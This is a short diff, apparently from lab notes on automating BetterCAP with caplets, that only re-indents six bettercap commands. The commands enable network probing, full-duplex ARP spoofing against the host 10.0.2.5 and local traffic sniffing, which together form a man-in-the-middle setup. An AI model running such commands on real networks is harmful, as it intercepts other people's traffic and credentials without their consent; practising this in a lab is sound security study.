@@ -2,12 +2,12 @@
 
     
     
-net.probe on
-set arp.spoof.fullduplex true 
-set arp.spoof.targets 10.0.2.5
-arp.spoof on
-set net.sniff.local true
-net.sniff on
+ net.probe on
+ set arp.spoof.fullduplex true 
+ set arp.spoof.targets 10.0.2.5
+ arp.spoof on
+ set net.sniff.local true
+ net.sniff on
 
 
 # Automate BetterCAP using Caplets
